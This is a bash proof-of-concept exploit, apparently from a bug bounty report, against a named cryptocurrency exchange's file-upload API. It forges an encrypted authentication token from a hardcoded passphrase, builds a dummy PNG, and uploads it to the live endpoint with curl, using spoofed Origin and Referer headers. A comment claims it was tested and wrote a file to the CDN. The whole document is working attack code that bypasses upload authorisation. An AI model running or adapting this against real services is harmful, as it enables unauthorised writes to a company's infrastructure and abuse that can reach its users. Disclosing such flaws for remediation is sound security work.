#!/bin/bash
# Prerequisites: python3, pycryptodome (pip install pycryptodome)
# Tested: 2026-04-10 — HTTP 201, file written to CDN

# Step 1: generate forged token
TOKEN=$(python3 - << 'PYEOF'
import os, base64, hashlib, json, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def evp_bytes_to_key(password, salt):
    password = password.encode()
    d, prev = b'', b''
    while len(d) < 48:
        prev = hashlib.md5(prev + password + salt).digest()
        d += prev
    return d[:32], d[32:48]

salt = os.urandom(8)
key, iv = evp_bytes_to_key("iu-fbf_2502=gexeanch", salt)
cipher = AES.new(key, AES.MODE_CBC, iv)
pt = json.dumps({"timestamp": int(time.time()*1000), "token": "4-not_hacked=kento"}).encode()
ct = cipher.encrypt(pad(pt, AES.block_size))
print(base64.b64encode(b"Salted__" + salt + ct).decode())
PYEOF
)

echo "[*] Token: $TOKEN"

# Step 2: create minimal valid 1x1 PNG
python3 -c "
import struct, zlib
def chunk(name, data):
    c = name + data
    return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
idat = chunk(b'IDAT', zlib.compress(b'\x00\xff\x00\x00'))
iend = chunk(b'IEND', b'')
open('/tmp/bb_poc.png','wb').write(sig+ihdr+idat+iend)
"

# Step 3: upload — expect HTTP 201 + "success":true + fileUrl
curl -sk -w "\nHTTP %{http_code}" \
  -X POST "https://exchange-fe.crypto.com/v1/files/vip-form-upload-files" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36" \
  -H "Origin: https://webview.titan.crypto.com" \
  -H "Referer: https://webview.titan.crypto.com/" \
  -F "token=${TOKEN}" \
  -F "files=@/tmp/bb_poc.png;type=image/png;filename=bb_poc.png"
